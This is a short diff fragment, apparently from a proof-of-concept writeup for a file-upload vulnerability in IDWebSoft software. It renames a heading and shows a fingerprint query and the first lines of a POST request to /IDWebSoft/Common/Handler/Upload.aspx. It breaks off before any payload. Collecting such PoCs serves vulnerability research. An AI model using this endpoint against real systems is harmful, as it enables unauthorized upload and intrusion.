@@ -6,7 +6,7 @@
 body="IDWebSoft/"
 ```
 
-## poc
+## POC
 ```java
 POST /IDWebSoft/Common/Handler/Upload.aspx HTTP/1.1
 Host: 
